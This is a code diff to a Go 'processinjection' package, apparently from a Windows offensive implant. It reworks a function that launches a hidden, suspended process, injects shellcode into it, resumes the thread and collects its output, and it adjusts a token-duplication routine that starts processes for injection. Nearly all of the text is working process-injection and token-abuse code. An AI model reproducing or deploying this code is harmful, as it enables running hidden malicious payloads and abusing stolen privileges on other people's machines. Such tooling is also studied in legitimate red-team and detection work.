@@ -4,10 +4,12 @@
 package processinjection
 
 import (
+	"bytes"
 	"debug/pe"
 	"errors"
 	"fmt"
 	"log"
+	"os/exec"
 	"strconv"
 	"strings"
 	"syscall"
@@ -21,6 +23,61 @@ import (
 )
 
 func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
+	exeToSpawn := args[0]
+	timeoutMinutes := args[1]
+	mins, err := strconv.Atoi(timeoutMinutes)
+	if err != nil {
+		return "", err
+	}
+	cmd := exec.Command(exeToSpawn)
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: windows.CREATE_SUSPENDED,
+	}
+	var stdoutBuf, stderrBuf bytes.Buffer
+	cmd.Stdout = &stdoutBuf
+	cmd.Stderr = &stderrBuf
+	cmd.Start()
+	pid := cmd.Process.Pid
+	// TODO get handle to main thread and set thread context. then resume it.
+	hThread, _, err := RemoteInjectReturnThread(shellcode, fmt.Sprintf("%d", pid))
+	if err != nil {
+		log.Fatal(err)
+	}
+	_, err = windows.ResumeThread(windows.Handle(hThread))
+	if err != nil {
+		log.Fatal(err)
+	}
+	var exitCode uint32
+	var STILL_RUNNING uint32 = 259
+	var loops int
+	log.Println("started thread")
+	for {
+		log.Printf("Loop %d", loops)
+		if mins != 0 {
+			if loops > (mins * 60) {
+				break
+			}
+		}
+		_, err := winapi.GetExitCodeThread(syscall.Handle(hThread), &exitCode)
+		log.Printf("Thread exit code %d\n", exitCode)
+		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
+			return "", err
+		}
+		if exitCode == STILL_RUNNING {
+			time.Sleep(1000 * time.Millisecond)
+			loops++
+		} else {
+			break
+		}
+	}
+	cmd.Process.Kill()
+	outStr, errStr := stdoutBuf.String(), stderrBuf.String()
+	return fmt.Sprintf("\nSTDOUT:\n%s\nSTDERR:\n%s\n", outStr, errStr), nil
+}
+
+/*
+func SpawnInjectReadPipeOld(shellcode []byte, args []string) (string, error) {
 	if len(args) < 2 {
 		return "", fmt.Errorf("Not Enough Args.")
 	}
@@ -100,13 +157,16 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	var exitCode uint32
 	var STILL_RUNNING uint32 = 259
 	var loops int
+	log.Println("started thread")
 	for {
+		log.Printf("Loop %d", loops)
 		if mins != 0 {
 			if loops > (mins * 60) {
 				break
 			}
 		}
 		_, err := winapi.GetExitCodeThread(syscall.Handle(pi.Thread), &exitCode)
+		log.Printf("Thread exit code %d\n", exitCode)
 		if err != nil && !strings.Contains(err.Error(), "operation completed successfully") {
 			return "", err
 		}
@@ -117,13 +177,16 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 			break
 		}
 	}
+	log.Println("Before process term")
 	windows.TerminateProcess(pi.Process, 0)
 	windows.CloseHandle(pi.Process)
-	buffer := make([]byte, 1024)
+	log.Println("After process term")
+	buffer := make([]byte, 100)
 	var nRead uint32
 	var results string
 	for {
 		err = windows.ReadFile(windows.Handle(hChildStdoutRead), buffer, &nRead, nil)
+		log.Println(nRead)
 		if err != nil {
 			break
 		}
@@ -131,6 +194,7 @@ func SpawnInjectReadPipe(shellcode []byte, args []string) (string, error) {
 	}
 	return results, nil
 }
+*/
 
 func SpawnInjectWithToken(shellcode []byte, exeToSpawn string, pidStr string) (string, error) {
 	pid, err := strconv.Atoi(pidStr)
@@ -157,7 +221,7 @@ func SpawnInjectWithToken(shellcode []byte, exeToSpawn string, pidStr string) (s
 	if err != nil {
 		return "", err
 	}
-	res, err := winapi.CreateProcessWithTokenW(syscall.Handle(duplicatedToken), 0x00000002, exePtr, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, uintptr(winapi.NullRef), &si, &pi)
+	res, err := winapi.CreateProcessWithTokenW(syscall.Handle(duplicatedToken), 0x00000001, exePtr, windows.CREATE_NO_WINDOW|windows.CREATE_SUSPENDED, uintptr(winapi.NullRef), &si, &pi)
 	if !res {
 		return "", err
 	}
